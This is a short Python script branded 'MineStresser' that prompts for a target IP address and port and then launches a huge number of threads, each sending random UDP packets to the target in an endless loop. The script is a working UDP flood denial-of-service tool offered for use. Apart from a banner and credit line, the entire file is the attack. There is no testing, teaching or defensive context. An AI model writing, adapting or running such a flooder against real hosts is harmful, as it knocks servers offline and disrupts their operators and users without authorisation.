print ("\033[92m")
import socket
import time
import os
import random
import threading
import sys

# Coding MineStresser
# Attack
def attack(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
    len = random.randint(256, 512)
    payload = os.urandom(len)
    s.sendto(payload, (ip, port))
# VPS
os.system("figlet MineStresser")
print("\033[92m")
print("Credit: @MineGamerST")
print(" ")
time.sleep(1)
ip = input("IP: ")
port = int(input("Port: "))
time.sleep(1)
print(" ")
os.system("clear")
os.system("figlet MineStresser")
print(" ")
print(f"Running {ip} {port}")
# Start Attack

for i in range(500000000000):
  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
  t.start()
while True:
  time.sleep(1)
